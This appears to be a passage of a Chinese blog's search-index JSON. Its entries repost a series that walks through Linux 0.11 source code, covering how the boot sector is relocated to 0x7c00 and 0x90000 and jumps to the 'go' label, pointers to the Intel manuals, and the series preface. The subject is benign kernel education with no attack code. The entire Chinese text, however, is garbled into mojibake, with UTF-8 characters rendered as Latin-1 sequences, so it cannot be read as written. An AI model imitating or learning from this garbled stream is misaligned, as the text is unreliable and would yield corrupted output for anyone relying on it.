ä½äºæœ€ç»ˆç¼–è¯‘å¥½åçš„äºŒè¿›åˆ¶æ–‡ä»¶çš„ 0x08 å¤„ï¼Œé‚£ go å°±ç­‰äº 0x08ï¼Œè€Œæœ€ç»ˆ CPU è·³è½¬åˆ°çš„åœ°å€å°±æ˜¯ 0x90008 å¤„ã€‚ æ‰€ä»¥åˆ°æ­¤ä¸ºæ­¢ï¼Œå‰ä¸¤å›çš„å†…å®¹ï¼Œå…¶å®å°±æ˜¯ä¸€æ®µ 512 å­—èŠ‚çš„ä»£ç å’Œæ•°æ®ï¼Œä»ç¡¬ç›˜çš„å¯åŠ¨åŒºå…ˆæ˜¯è¢«ç§»åŠ¨åˆ°äº†å†…å­˜ 0x7c00 å¤„ï¼Œç„¶ååˆç«‹åˆ»è¢«ç§»åŠ¨åˆ° 0x90000 å¤„ï¼Œå¹¶ä¸”è·³è½¬åˆ°æ­¤å¤„å¾€åå†ç¨ç¨åç§» go è¿™ä¸ªæ ‡ç­¾æ‰€ä»£è¡¨çš„åç§»åœ°å€å¤„ï¼Œä¹Ÿå°±æ˜¯ mov ax,cs è¿™è¡ŒæŒ‡ä»¤çš„ä½ç½®ã€‚ ä»ç„¶æ˜¯ä¿æŒæ¯å›çš„ç®€æ´ï¼Œæœ¬æ–‡å°±è®²åˆ°è¿™é‡Œï¼Œå¸Œæœ›å¤§å®¶è¿˜è·Ÿå¾—ä¸Šï¼Œæ¥ä¸‹æ¥çš„ä¸‹ä¸€å›ï¼Œæˆ‘ä»¬å°±æŠŠç›®å…‰å®šä½åˆ° go æ ‡ç­¾å¤„å¾€åçš„ä»£ç ï¼Œçœ‹çœ‹ä»–åˆè¦æŠ˜è…¾äº›ä»€ä¹ˆå§ã€‚ åé¢çš„ä¸–ç•Œè¶Šæ¥è¶Šç²¾å½©ï¼Œæ¬²çŸ¥åäº‹å¦‚ä½•ï¼Œä¸”å¬ä¸‹å›åˆ†è§£ã€‚ â€”â€”- æœ¬å›æ‰©å±•ä¸å»¶ä¼¸ â€”â€”- æœ‰å…³å¯„å­˜å™¨çš„è¯¦ç»†ä¿¡æ¯ï¼Œå¯ä»¥å‚è€ƒ Intel æ‰‹å†Œï¼š Volume 1 Chapter 3.2 OVERVIEW OF THE BASIC EXECUTION ENVIRONMEN å¦‚æœæƒ³äº†è§£æ±‡ç¼–æŒ‡ä»¤çš„ä¿¡æ¯ï¼Œå¯ä»¥å‚è€ƒ Intel æ‰‹å†Œï¼š Volume 2 Chapter 3 ~ Chapter 5 æ¯”å¦‚æœ¬æ–‡å‡ºç°çš„ sub æŒ‡ä»¤ï¼Œä½ å®Œå…¨æ²¡å¿…è¦å»ç™¾åº¦å®ƒçš„ç”¨æ³•ï¼Œç›´æ¥çœ‹æ‰‹å†Œã€‚ Intel æ‰‹å†Œå¯¹äºç†è§£åº•å±‚çŸ¥è¯†éå¸¸ç›´æ¥æœ‰æ•ˆï¼Œä½†å´æ²¡æœ‰å¾ˆå¥½çš„ä¸­æ–‡ç¿»è¯‘ç‰ˆæœ¬ï¼Œå› æ­¤è®©è®¸å¤šäººæœ›è€Œç”Ÿç•ï¼Œåªèƒ½å»çœ‹ä¸€äº›é”™è¯¯ç™¾å‡ºçš„ä¸­æ–‡äºŒæ‰‹èµ„æ–™å’Œåšå®¢ã€‚å› æ­¤æˆ‘ä¹Ÿå‘èµ·äº†ä¸€ä¸ª Intel æ‰‹å†Œç¿»è¯‘è®¡åˆ’ï¼Œå°±åœ¨é˜…è¯»åŸæ–‡çš„ GitHub é‡Œï¼Œæ„Ÿå…´è¶£çš„åŒèƒä»¬å¯ä»¥å‚ä¸è¿›æ¥ï¼Œæˆ‘ä»¬å…±åŒå®Œæˆä¸€ä»½ä¼Ÿå¤§çš„äº‹ã€‚ å¸Œæœ›ä½ è·Ÿå®Œæ•´ä¸ªç³»åˆ—ï¼Œæ”¶è·çš„ä¸ä»…ä»…æ˜¯ Linux 0.11 æºç çš„äº†è§£ï¼Œæ›´æ˜¯è‡ªå·±æ¢ç´¢é—®é¢˜å’Œå¯»æ‰¾ç­”æ¡ˆçš„ä¸€ä¸ªç§‘å­¦æ€è€ƒæ–¹å¼ã€‚ æ‰€ä»¥æ¯æ¬¡æœ¬å›æ‰©å±•ä¸å»¶ä¼¸è¿™é‡Œï¼Œå¸Œæœ›ä½ ä¹Ÿèƒ½æ¯å¤©è¿›æ­¥ä¸€ç‚¹ç‚¹ï¼Œå®è·µèµ·æ¥ï¼Œå†ä¸æµï¼Œä¹Ÿèƒ½å¤šå­¦å‡ ä¸ªè‹±è¯­å•è¯ä¸æ˜¯ï¼Ÿ ","date":"2021-12-05","objectID":"/2021/12/linux-0.11-01/:3:0","tags":["Linux","kernel"],"title":"Linux-0.11-01","uri":"/2021/12/linux-0.11-01/"},{"categories":["LINUX"],"content":"åŸæ–‡åœ°å€ ä½ ç®¡è¿™ç ´ç©æ„å«æ“ä½œç³»ç»Ÿæºç  | ç¬¬ä¸€å› æœ€å¼€å§‹çš„ä¸¤è¡Œä»£ç  ä½ ç®¡è¿™ç ´ç©æ„å«æ“ä½œç³»ç»Ÿæºç  | ç¬¬äºŒå› è‡ªå·±ç»™è‡ªå·±æŒªä¸ªåœ°å„¿ ","date":"2021-12-05","objectID":"/2021/12/linux-0.11-01/:4:0","tags":["Linux","kernel"],"title":"Linux-0.11-01","uri":"/2021/12/linux-0.11-01/"},{"categories":["LINUX"],"content":"é—ªå®¢Linuxæ“ä½œç³»ç»Ÿç³»åˆ—åºè¨€","date":"2021-11-18","objectID":"/2021/11/linux-0.11-%E5%BA%8F/","tags":["Linux","kernel"],"title":"Linux-0.11-åº","uri":"/2021/11/linux-0.11-%E5%BA%8F/"},{"categories":["LINUX"],"content":"æœ¬æ–‡æ˜¯Linux 0.11ç³»åˆ—å­¦ä¹ è®°å½•çš„åºè¨€ç¯‡ï¼Œä¸»è¦æ˜¯é—ªå®¢åœ¨å¾®ä¿¡å…¬ä¼—å·ä¸Šå‘å¸ƒçš„ç›¸å…³å†…å®¹çš„æ•´ç†æ€»ç»“ã€‚ ","date":"2021-11-18","objectID":"/2021/11/linux-0.11-%E5%BA%8F/:0:0","tags":["Linux","kernel"],"title":"Linux-0.11-åº","uri":"/2021/11/linux-0.11-%E5%BA%8F/"},{"categories":["LINUX"],"content":"å‰è¨€ æœ¬ç³»åˆ—æ˜¯é—ªå®¢sunçš„æœ€æ–°å¾®ä¿¡å…¬ä¼—å·æŠ€æœ¯æ–‡ç« ç³»åˆ—â€“ã€Šä½ ç®¡è¿™ç ´ç©æ„å«æ“ä½œç³»ç»Ÿæºç ã€‹ã€‚é—ªå®¢sunçš„æ–‡ç« åŸºæœ¬å…¨æ˜¯å¹²è´§ï¼Œæ‡‚çš„éƒ½æ‡‚ï¼Œè¿™æ¬¡çš„æ–°ç³»åˆ—å®åœ¨æ˜¯æä¸­äº†å¾ˆå¤šäººçš„ç—›ç‚¹ï¼Œèƒ½å¾ˆå¥½åœ°å¸®åŠ©å¤§å®¶æ·±å…¥ç†è§£ Linux æ“ä½œç³»ç»Ÿã€‚ æœ¬ç€å­¦ä¹ å’Œåˆ†äº«çš„ç›®çš„ï¼Œblog ä¼šè¿›è¡Œè¯¥ç³»åˆ—æ–‡ç« çš„åŒæ­¥æ›´æ–°ï¼Œå¸Œæœ›èƒ½æœ‰æ›´å¤šæƒ³å­¦ä¹ æŠ€æœ¯å¹²è´§çš„äººäº†è§£åˆ°é—ªå®¢sunå’Œä»–çš„æŠ€æœ¯æ–‡ã€‚åœ¨æ¯ç¯‡æ–‡ç« çš„æœ«å°¾ï¼Œä¼šæ”¾ä¸Šå…¬ä¼—å·é“¾æ¥ï¼Œå¸Œæœ›å¤§å®¶åœ¨å­¦ä¹ çš„åŒæ—¶ï¼Œä¹Ÿå¤šå¤šæ”¯æŒé—ªå®¢sunã€‚ å…¬ä¼—å· ä½å¹¶å‘ç¼–ç¨‹ï¼š ä»¥ä¸‹ä¸ºåŸæ–‡ï¼š å†™åœ¨å‰é¢ æ ¸å¿ƒä¿¡æ¯æç‚¼åˆ°å¼€å¤´ï¼Œä»¥èŠ‚çº¦å¤§å®¶çš„æ—¶é—´ã€‚ è¦å¹²å˜›ï¼šå†™ä¸€ä¸ªç³»åˆ— å•¥ç›®çš„ï¼šå¸¦å¤§å®¶æŠŠ Linux 0.11 æ ¸å¿ƒä»£ç ä¸æ“ä½œç³»ç»Ÿçš„è®¾è®¡æ€æƒ³å•ƒä¸‹æ¥ å«å•¥åï¼šä½ ç®¡è¿™ç ´ç©æ„å«æ“ä½œç³»ç»Ÿæºç  â€” åƒå°è¯´ä¸€æ ·å“è¯» Linux 0.11 æ ¸å¿ƒä»£ç  å‘æ–‡æ—¶é—´ï¼šæ¯å‘¨ä¸€å’Œæ¯å‘¨å›› é¢„è®¡ç« èŠ‚ï¼š60 å› äº’åŠ¨æ–¹å¼ï¼šå¾®ä¿¡ç¾¤ï¼ˆæ–‡æœ«æœ‰åŠ å…¥æ–¹å¼ï¼‰ ç³»åˆ—æ•´ä½“å¸ƒå±€ï¼š ç¬¬ä¸€éƒ¨åˆ†ï¼šè¿›å…¥å†…æ ¸å‰çš„è‹¦åŠ›æ´» ç¬¬äºŒéƒ¨åˆ†ï¼šå¤§æˆ˜å‰æœŸçš„åˆå§‹åŒ–å·¥ä½œ ç¬¬ä¸‰éƒ¨åˆ†ï¼šä¸€ä¸ªæ–°è¿›ç¨‹çš„è¯ç”Ÿ ç¬¬å››éƒ¨åˆ†ï¼šshell ç¨‹åºçš„åˆ°æ¥ ç¬¬äº”éƒ¨åˆ†ï¼šä»ä¸€ä¸ªå‘½ä»¤çš„æ‰§è¡Œçœ‹æ“ä½œç³»ç»Ÿå„æ¨¡å—çš„è¿ä½œ ç¬¬å…­éƒ¨åˆ†ï¼šæ“ä½œç³»ç»Ÿå“²å­¦ä¸æ€æƒ³ OKï¼Œä»¥ä¸Šå°±æ˜¯è¦è¯´çš„é‡è¦çš„äº‹ï¼Œä»¥ä¸‹æ˜¯å•°å—¦çš„éƒ¨åˆ†ã€‚ æˆ‘æ˜¯åˆ†å‰²çº¿ æ¯ä¸ªç¨‹åºå‘˜éƒ½æœ‰ä¸€ä¸ªæ“ä½œç³»ç»Ÿæ¢¦ï¼Œè€Œæ“ä½œç³»ç»Ÿä¹Ÿæ˜¯æ¯ä¸ªç¨‹åºå‘˜çš„å¿ƒç»“ã€‚ å¾ˆç²—ç³™åœ°äº†è§£ä¸€ç‚¹æ“ä½œç³»ç»ŸçŸ¥è¯†ï¼Œä¸€çŸ¥åŠè§£çš„ï¼Œå·²ç»æ— æ³•æ»¡è¶³å½“ä¸‹ç¨‹åºå‘˜çš„å£å‘³äº†ã€‚ä½†è¦è¯´æ·±å…¥å‰–ææ“ä½œç³»ç»Ÿï¼Œåˆæ˜¯å¤§éƒ¨åˆ†ç¨‹åºå‘˜éƒ½å¾ˆæƒ¶æçš„ä¸€ä»¶äº‹ã€‚é‚£å¦‚æœæ˜¯è¦è¯»ä¸€éæ“ä½œç³»ç»Ÿæºç ï¼Œé‚£ç®€ç›´è·Ÿè¦äº†å‘½ä¸€æ ·ã€‚ å…¶å®ï¼Œæ“ä½œç³»ç»Ÿçš„æºç å¹¶æ²¡æœ‰é‚£ä¹ˆå¯æ€•ï¼Œå¯ä¸ºä»€ä¹ˆå³ä¾¿æ˜¯ Linux 0.11 è¿™ç§ä»£ç é‡æœ€å°‘çš„ç‰ˆæœ¬ï¼Œä»ç„¶ä»¤å¾ˆå¤šäººæœ›è€Œå´æ­¥å‘¢ï¼Ÿ ä¸ºä»€ä¹ˆæœ›è€Œå´æ­¥ å…¶å®ï¼Œå¾ˆå¤šä¼˜ç§€çš„æ“ä½œç³»ç»Ÿä¹¦ç±éƒ½æ˜¯ä»¥ Linux 0.11 è¿™ä¸ªç»å…¸ç‰ˆæœ¬ä¸ºç ”ç©¶å¯¹è±¡è¿›è¡Œè®²è§£çš„ï¼Œæ¯”å¦‚ã€ŠLinux å†…æ ¸è®¾è®¡çš„è‰ºæœ¯ã€‹ã€ ã€ŠLinux å†…æ ¸å®Œå…¨æ³¨é‡Šã€‹ç­‰ã€‚ä½†æˆ‘ä»¬æƒ³ä¸€ä¸‹ï¼Œå½“æˆ‘ä»¬è¯»ä¸€æœ¬å°è¯´æ—¶ï¼Œä¸ºä»€ä¹ˆå³ä¾¿æ˜¯éå¸¸å¤§éƒ¨å¤´çš„å°è¯´ï¼Œä¹Ÿèƒ½é…£ç•…æ·‹æ¼“ä»å¤´è¯»åˆ°å°¾ï¼Ÿ å…ˆä¸ç›´æ¥å›ç­”è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹**ã€Šå¤©é¾™å…«éƒ¨ã€‹**çš„æœ€å¼€å¤´ï¼š â€œé’å…‰é—ªåŠ¨ï¼Œä¸€æŸ„é’é’¢å‰‘å€åœ°åˆºå‡ºï¼ŒæŒ‡å‘ä¸­å¹´æ±‰å­å·¦è‚©ï¼Œä½¿å‰‘å°‘å¹´ä¸å¾…å‰‘æ‹›ç”¨è€ï¼Œè…•æŠ–å‰‘æ–œï¼Œå‰‘é”‹å·²å‰Šå‘é‚£æ±‰å­å³é¢ˆã€‚é‚£ä¸­å¹´æ±‰å­â€¦â€ è®°ä½è¿™ä¸ªæ„Ÿè§‰æ²¡ï¼Ÿæˆ‘ä»¬å†çœ‹ä¸€ä¸‹ã€ŠLinux å†…æ ¸è®¾è®¡çš„è‰ºæœ¯ã€‹çš„æœ€å¼€å¤´ï¼š â€œå¯¹äºæ“ä½œç³»ç»Ÿè€Œè¨€ï¼Œç¨³å®šä¸”å¯é åœ°è¿è¡Œæ˜¯æœ€é‡è¦çš„ã€‚ç°è¡ŒæŠ€æœ¯æ–¹æ¡ˆæ˜¯å°†ç”¨æˆ·è¿›ç¨‹ä¸ç”¨æˆ·è¿›ç¨‹ä¹‹é—´ã€ç”¨æˆ·è¿›ç¨‹ä¸æ“ä½œç³»ç»Ÿä¹‹é—´è¿›è¡Œåˆ†ç¦»ï¼Œæ“ä½œç³»ç»Ÿå¯ä»¥ç®¡ç†ç”¨æˆ·è¿›ç¨‹ï¼Œä½†æ˜¯ç”¨æˆ·è¿›ç¨‹ä¹‹é—´ä¸èƒ½ç›¸äº’å¹²é¢„ â€¦â€ å¥½äº†ï¼Œä¸ç”¨è¯»ä¸‹å»äº†ï¼Œè¿™å¥è¯çœ‹ä¼¼é«˜ç»è¿œç©åœ°ä»å®è§‚ä¸Šå¸®æˆ‘ä»¬æ¢³ç†æ“ä½œç³»ç»Ÿä½“ç³»ç»“æ„ï¼Œä½†å¯¹äºå°šä¸äº†è§£æ“ä½œç³»ç»Ÿçš„äººæ¥è¯´ï¼Œå®Œå…¨ä¸çŸ¥é“å®ƒåœ¨è¯´ä»€ä¹ˆï¼Œåªæœ‰åŠé€€çš„ä½œç”¨ã€‚ è™½ç„¶è¯´æ€æƒ³å¾ˆé‡è¦ï¼Œä½†ä½ åœ¨æ²¡æœ‰ä»»ä½•ç»†èŠ‚åšç§¯ç´¯æ—¶å»å¼ºè¡Œè¿›è¡Œæ€æƒ³çš„æ‹”é«˜ï¼Œæ˜¯æ‹”ä¸ä¸Šå»çš„ï¼Œè¿˜ä¸å¦‚ä¸€ç›´ä¿æŒä¸€å¼ ç™½çº¸çš„çŠ¶æ€ã€‚ åè§‚ã€Šå¤©é¾™å…«éƒ¨ã€‹çš„å¼€å¤´ï¼Œè¿äººç‰©çš„åå­—éƒ½æ²¡æœ‰ï¼Œæ›´åˆ«è¯´æ¢³ç†æ•´ä¸ªä½“ç³»ç»“æ„äº†ï¼Œç›´æ¥ä¸Šæ¥ä¸€ä¸ªç²¾å½©é•œå¤´ï¼Œè®©ä½ è¿…é€Ÿè¿›å…¥æ•…äº‹æƒ…èŠ‚ã€‚ å¯æ˜¯è¯»å®Œæ•´éƒ¨å°è¯´çš„è¯»è€…ï¼Œæ— ä¸€ä¸å¯¹é‡Œé¢çš„äººç‰©å¦‚æ•°å®¶çï¼Œå¯¹å¤§ç†çš„é£å…‰ä»¿ä½›äº²çœ¼çœ‹è§äº†ä¸€èˆ¬ï¼Œå¯¹å®‹è¾½çŸ›ç›¾çš„æ¿€çƒˆæ„ŸåŒèº«å—ã€‚ ä¸ºä»€ä¹ˆä¼šè¿™æ ·å‘¢ï¼Ÿå› ä¸ºä¸€åˆ‡çš„çˆ±æ¨æƒ…ä»‡å’Œæ°‘æ—çŸ›ç›¾ï¼Œéƒ½æ˜¯æˆ‘ä»¬é€šè¿‡ä¸€ä¸ªä¸ªäººç‰©å’Œäº‹ä»¶çš„åˆ»ç”»ï¼Œæ„Ÿæ‚Ÿå‡ºæ¥çš„ã€‚åªæœ‰è‡ªå·±æ„Ÿæ‚Ÿå‡ºæ¥çš„çŸ¥è¯†å’Œé è‡ªå·±æ€»ç»“å‡ºæ¥çš„ç»“è®ºï¼Œæ‰çœŸæ­£å±äºè‡ªå·±ã€‚ è€Œé‚£äº›ä¸€ä¸Šæ¥å°±è¯•å›¾æŠŠæ•´ä¸ªè„‰ç»œç»™ä½ æ¢³ç†æ¸…æ¥šçš„å°è¯•ï¼Œå¯¹äºæ–°æ‰‹æ¥è¯´æ— ä¸€ä¸æ˜¯å¾’åŠ³ï¼Œå³ä¾¿æ˜¯æ­»è®°ç¡¬èƒŒè®°ä½äº†ï¼Œä¹Ÿç»ˆç©¶ä¸æ˜¯å±äºè‡ªå·±çš„çŸ¥è¯†ï¼Œæ— æ³•æ„ŸåŒèº«å—ã€‚ æˆ‘å­¦ä¹ æ“ä½œç³»ç»Ÿçš„è¿‡ç¨‹ä¸­ï¼Œä¹Ÿæœ‰è¿™æ ·çš„æ„Ÿè§‰ã€‚ æˆ‘æ›¾ä¸€æ¬¡æ¬¡è¯•å›¾ä»ä¸€ä¸ªä¸Šå¸è§†è§’æ¥çœ‹æ“ä½œç³»ç»Ÿçš„çŸ¥è¯†ä½“ç³»ï¼Œä»å®è§‚å±‚é¢è·Ÿç€å¤§éƒ¨å¤´ä¹¦ç±æ¢³ç†æ“ä½œç³»ç»Ÿçš„æ•´ä½“é€»è¾‘ï¼Œæˆ‘å‘ç°æ— ä¸€ä¸æ˜¯ä»¥å¤±è´¥å‘Šç»ˆã€‚ è€Œå½“æˆ‘æ”¾ä¸‹åŒ…è¢±ï¼Œç”¨è¯»ä¸€æœ¬å°è¯´çš„å¿ƒæ€æ¥å»é˜…è¯» Linux æºä»£ç æ—¶ï¼Œæˆ‘å‘ç°ï¼Œæˆ‘ä»æ¥æ²¡æœ‰å»æƒ³ç€æ¢³ç†å‡ºä»€ä¹ˆä½“ç³»ï¼Œä½†ä¸çŸ¥é“ä»å“ªä¸€è¡Œä»£ç å¼€å§‹ï¼Œæ•´ä¸ªæ“ä½œç³»ç»Ÿçš„ä½“ç³»ç»“æ„å·²ç»è¾ƒä¸ºæ¸…æ™°åœ°å‡ºç°åœ¨æˆ‘é¢å‰äº†ï¼Œç«Ÿæ˜¯é‚£ä¹ˆçš„ä¸çŸ¥ä¸è§‰ã€‚ è€Œä¸”æˆ‘ä¹Ÿæ¸…æ™°åœ°çŸ¥é“ï¼Œè¿™æ ·çš„ä½“ç³»æ˜¯æ€ä¹ˆä¸€æ­¥æ­¥ä»ç¬¬ä¸€è¡Œä»£ç å¼€å§‹ï¼Œé€æ­¥å»ºç«‹èµ·æ¥çš„ã€‚ è™½ç„¶æˆ‘è¿˜æ²¡æœ‰è§¦ç±»æ—é€šï¼ŒçœŸæ­£ç†è§£æ“ä½œç³»ç»Ÿçš„å“²å­¦ä¸è®¾è®¡æ€æƒ³ï¼Œä¹Ÿä¸èƒ½å‡­è‡ªå·±çš„æƒ³æ³•å†™å‡ºä¸€ä¸ªæ–°çš„æ“ä½œç³»ç»Ÿæ¥ï¼Œä½†æœ€åˆçš„è¿™é“åæˆ‘ç®—æ˜¯è¿‡å»äº†ã€‚ æ‰€ä»¥æˆ‘æƒ³æŠŠè¿™äº›æ¢³ç†ä¸€ä¸‹ï¼Œåˆ†äº«ç»™å¤§å®¶ã€‚åŒæ—¶ä¹Ÿèƒ½æ›´å¥½åœ°è®©è‡ªå·±å·©å›ºç»†èŠ‚ï¼Œæœ€ç»ˆçœŸæ­£ç†è§£æ“ä½œç³»ç»Ÿçš„æ€æƒ³ï¼Œè¾¾åˆ°è§¦ç±»æ—é€šã€‚ å¦‚ä½•åˆ†äº«å‘¢ï¼Ÿ æ‰“ç®—å†™ä¸ªæ–°ç³»åˆ— æˆ‘å¹¶ä¸æ˜¯è¯´ã€ŠLinux å†…æ ¸è®¾è®¡çš„è‰ºæœ¯ã€‹è¿™æœ¬ä¹¦ä¸å¥½ï¼Œè€Œæ˜¯æƒ³ç€èƒ½ä¸èƒ½ä¹Ÿä»¥å†™å°è¯´ä¸€æ ·çš„å¿ƒæ€å’Œæ–¹å¼ï¼Œæ¥ç»™å¤§å®¶ä»å¤´åˆ°å°¾è®²è¿°è¿™éƒ¨ Linux 0.11 çš„æºç ã€‚ æˆ‘æ‰“ç®—æŠŠè¿™ä¸ªç³»åˆ—å«åš ã€Šä½ ç®¡è¿™ç ´ç©æ„å«æ“ä½œç³»ç»Ÿæºç  â€”â€” åƒå°è¯´ä¸€æ ·å“è¯» Linux 0.11 æ ¸å¿ƒä»£ç ã€‹ åœ¨è¿™é‡Œé¢ï¼Œæˆ‘ä¸ä¼šç»å¸¸æŠŠæ“ä½œç³»ç»Ÿçš„ä½“ç³»æ¶æ„æŒ‚åœ¨å˜´è¾¹ï¼Œæ—¶æ—¶åˆ»åˆ»å¼ºè¡Œå¡åˆ°ä½ çš„è„‘å­é‡Œï¼Œè€Œæ˜¯é€šè¿‡ä¸€è¡Œä¸€è¡Œä»£ç é€æ¸å¸¦å…¥æƒ…èŠ‚ï¼Œæœ€ç»ˆè®©ä½ ä¸çŸ¥ä¸è§‰åœ°å‘ç°ï¼ŒåŸæ¥æ•´ä¸ªæ“ä½œç³»ç»Ÿçš„ä½“ç³»å°±è¿™æ ·ä¸€ç‚¹ä¸€ç‚¹å»ºç«‹èµ·æ¥äº†ã€‚ æœ¬ç³»åˆ—çš„æ¯ä¸€ç« å†…å®¹éƒ½å¾ˆçŸ­ï¼Œåƒä¸‡ä¸è¦æœ‰å¿ƒé‡Œè´Ÿæ‹…ï¼Œè€Œæ­£æ˜¯è¿™äº›ç®€å•çš„äº‹æƒ…è”ç³»åˆ°ä¸€èµ·ï¼Œå°±æ„æˆäº†æ•´ä¸ªæ“ä½œç³»ç»Ÿçš„å¤æ‚çš„è®¾è®¡ã€‚ æ‰€ä»¥ä¹Ÿå¯¼è‡´äº†ï¼Œå•ç‹¬çœ‹ä»»ä½•ä¸€ç« éƒ½ä¸ä¼šæœ‰æ˜¾è‘—çš„æ”¶è·ï¼Œä½†å¦‚æœæ•´ä¸ªç³»åˆ—éƒ½èƒ½è·Ÿä¸‹æ¥ï¼Œå¹¶ä¸”æ¯ä¸€ç« çš„å†…å®¹éƒ½èƒ½åšå‡ºæ€è€ƒï¼ŒæŠŠä¸æ‡‚çš„åœ°æ–¹åŠæ—¶è§£å†³ï¼Œæˆ‘ä¿è¯ä½ ä¼šå¯¹æ“ä½œç³»ç»Ÿæœ‰ä¸€ä¸ªå…¨æ–°çš„ï¼Œæ·±å…¥åˆ°ç»†èŠ‚çš„è®¤è¯†ã€‚ å¸Œæœ›ä½ è·Ÿæˆ‘èµ°å®Œè¿™ä¸ªç³»åˆ—ï¼Œä¹Ÿèƒ½å‘å‡ºä¸€å¥æ„Ÿå¹ï¼ŒåŸæ¥æ“ä½œç³»ç»Ÿæºç ä¸è¿‡å¦‚æ­¤ï¼Œå°±æ˜¯è¿™ä¹ˆä¸ªç ´ç©æ„è€Œå·²ï¼ ä½†åŒæ—¶ï¼Œä½ ä¹Ÿè¦æœ‰è€å¿ƒï¼Œä½ ä¸è¦æ€»æƒ³ç€ï¼Œè¯»åˆ°è¿™äº†æˆ‘æ€ä¹ˆè¿˜æ˜¯æ²¡è§‰å¾—è‡ªå·±æ‡‚æ“ä½œç³»ç»Ÿäº†å‘¢ï¼Ÿæ€ä¹ˆè¿˜æ˜¯æ²¡è®²å¤šè¿›ç¨‹å¦‚ä½•è°ƒåº¦å‘¢ï¼Ÿè®°ä½ï¼Œäº«å—å½“ä¸‹ï¼Œå½“ä¸‹ä½ å­¦çš„æ¯ä¸€ä¸ªçœ‹ä¼¼æ²¡å•¥ç”¨çš„çŸ¥è¯†ï¼Œéƒ½æ˜¯åé¢è±ç„¶å¼€æœ—è¿™ç§æ„Ÿè§‰çš„åŸºçŸ³ã€‚ ç­‰ç­‰ï¼Œæˆ‘è®°å¾—é—ªå®¢ä¹‹å‰ä¹Ÿè¯´è¦å†™ä¸ªè‡ªåˆ¶æ“ä½œç³»ç»Ÿç³»åˆ—å‘¢ï¼Ÿä¸è¿‡å¥½åƒâ€¦ ä¸‡ä¸€ä¸­é€”åˆé¸½äº†æ€ä¹ˆåŠ è¯è¯´å›æ¥ï¼Œæˆ‘çš„è€è¯»è€…æœ‰ç‚¹æƒ¨ï¼Œä¹‹å‰æ€»æ˜¯çœ‹æˆ‘ä¿¡èª“æ—¦æ—¦è¯´è¦å†™æ“ä½œç³»ç»Ÿçš„ç³»åˆ—ï¼Œä½†æ— ä¸€ä¾‹å¤–éƒ½æ˜¯ä¸­é€”å¤±è´¥äº†ã€‚ åšå®¢å›­ä¸Šå†™è¿‡ï¼Œå…¬ä¼—å·ä¸Šä¹Ÿå†™è¿‡ï¼Œè€Œå…¬ä¼—å·é‡Œçš„å¥½å¤šè¯»è€…å°±æ˜¯è¢«æˆ‘çš„è‡ªåˆ¶æ“ä½œç³»ç»Ÿç³»åˆ—éª—è¿›æ¥çš„ï¼Œç„¶åå†™åˆ°ç¬¬äº”ç« æˆ‘å°±é¸½äº†ï¼Œå®åœ¨å¤ªè¿‡åˆ†äº†ï¼ æ‰€ä»¥æ¥ä¸‹æ¥è‡ªç„¶å°±æœ‰ä¸€ä¸ªå¤§å®¶éƒ½å…³å¿ƒçš„é—®é¢˜äº†ï¼Œå°±æ˜¯è¿™æ¬¡ä¼šä¸ä¼šåˆé¸½å‘¢ï¼Ÿ æˆ‘å¯ä»¥è‚¯å®šçš„æ˜¯ï¼Œè¿™æ¬¡ç»å¯¹ç»å¯¹ç»å¯¹ç»å¯¹ç»å¯¹ç»å¯¹ä¸ä¼šä¸­é€”é¸½äº†ï¼å› ä¸ºæˆ‘æ­¤æ—¶æ­¤åˆ»å·²ç»æŠŠå…¨éƒ¨çš„å¤§çº²ä»¥åŠæ–‡ç« çš„å‰ 33 ç« çš„å†…å®¹å†™å¥½äº†ï¼Œå°±è—åœ¨æˆ‘çš„çŸ³å¢¨æ–‡æ¡£é‡Œã€‚åé¢çš„å†…å®¹æˆ‘æ‰“ç®—æ ¹æ®å‰é¢çš„åé¦ˆå’Œé—®ç­”ï¼Œä¸æ–­åšå‡ºè°ƒæ•´ã€‚ æ²¡é”™ï¼Œæ€»å…±æˆ‘è®¡åˆ’åˆ†å…­å¤§éƒ¨åˆ†ï¼Œå‰å››éƒ¨åˆ†ä½ ä¼šçœ‹åˆ°ä»å¼€æœºä¸€ç›´åˆ°æ“ä½œç³»ç»Ÿçš„æœ€åä¸€è¡Œä»£ç çš„å…¨éƒ¨ä¸»æµç¨‹ï¼Œç¬¬äº”éƒ¨åˆ†å°†é€šè¿‡ä¸€ä¸ªå‘½ä»¤çš„æ‰§è¡Œå°†æ“ä½œç³»ç»Ÿå„ä¸ªæ¨¡å—çš„è¿ä½œæ–¹å¼ä¸²ä¸€éï¼Œè€Œç¬¬å…­éƒ¨åˆ†ä¼šåšä¸€ä¸ªæ€æƒ³çš„æ‹”é«˜ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘è‡ªå·±ç»™è‡ªå·±æŒ–çš„ä¸€ä¸ªå‘å’ŒæŒ‘æˆ˜ã€‚ è€Œå…­å¤§éƒ¨åˆ†å¯¹åº”åˆ° Linux 0.11 æºç ä»å¼€æœºåˆ° shell çš„æµç¨‹å›¾ï¼Œæ˜¯è¿™æ ·çš„ã€‚ å…¶å®æœ¬å¯ä»¥æ—©æ—©å°±å¼€å§‹è¾¹å†™è¾¹å‘å¸ƒï¼Œä½†æƒ³ç€è¦æ˜¯è¿™æ¬¡ä¸­é€”åˆé¸½äº†è¯»è€…ï¼Œç€å®æœ‰ç‚¹ä¸å¥½æ„æ€ã€‚æ‰€ä»¥å°±å†’ç€ä¸­é€”å†™ä¸ä¸‹å»çš„é£é™©ï¼Œå…ˆæŠŠå¤§éƒ¨åˆ†æ–‡ç« æå‰å†™å¥½ã€‚ ä½†æˆ‘ä¹Ÿç»™è‡ªå·±ç•™äº†ä¸ªåè·¯ï¼Œå°±æ˜¯åªæå‰å†™äº† 33 ç« ï¼Œä¹Ÿå¤Ÿå¤§å®¶çœ‹å¥½å‡ ä¸ªæœˆäº†ï¼Œè¦æ˜¯å¤§å®¶ä¸æ§åœºï¼Œæˆ‘åé¢å°±ä¸æ›´äº†ï¼Œå“¼ï¼ˆå‚²å¨‡è¡¨æƒ….gifï¼‰ï¼ æå‰å†™å¥½æœ‰ä¸ªå¥½å¤„ï¼Œå°±æ˜¯å†™åˆ°åé¢çš„æ—¶å€™ï¼Œå‘ç°å‰é¢æœ‰äº›åœ°æ–¹å¯ä»¥æå‰åšä¸ªå¼•å­ï¼Œè¿™æ ·æ•´ä¸ªç³»åˆ—å°±æ›´å®Œæ•´äº†ï¼Œå¯ä»¥å‰åå‘¼åº”ï¼Œå¯è¯»æ€§å’Œæ”¶è·ä¹Ÿä¼šå¤§å¤§å¢åŠ ã€‚ 